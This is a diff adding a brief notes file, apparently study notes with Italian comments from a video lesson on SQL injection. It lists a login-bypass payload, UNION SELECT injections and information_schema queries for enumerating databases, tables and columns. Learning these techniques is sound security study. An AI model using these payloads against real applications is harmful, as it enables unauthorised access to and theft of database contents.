@@ -1,0 +1,28 @@
+#sql injection
+
+1' or 1=1 --  
+
+1' and 1=0 union select 1,2,3,4 from TABLE
+
+
+1'  and 1=0 union select 1,2,3    # potrebbe stampare 1 2 3 in alcuni punti del videoooo
+
+
+#######################################
+## information schema
+
+select schema_name from information_schema.schemata
+
+select table_name from information_schema.tables where schema_name = '  '
+
+select column_name from information_schema.columns where table_name= "nomeT"   
+
+select table_name, column_name from information_schema.columns where table_name= "nomeT"   
+
+
+
+
+
+
+
+
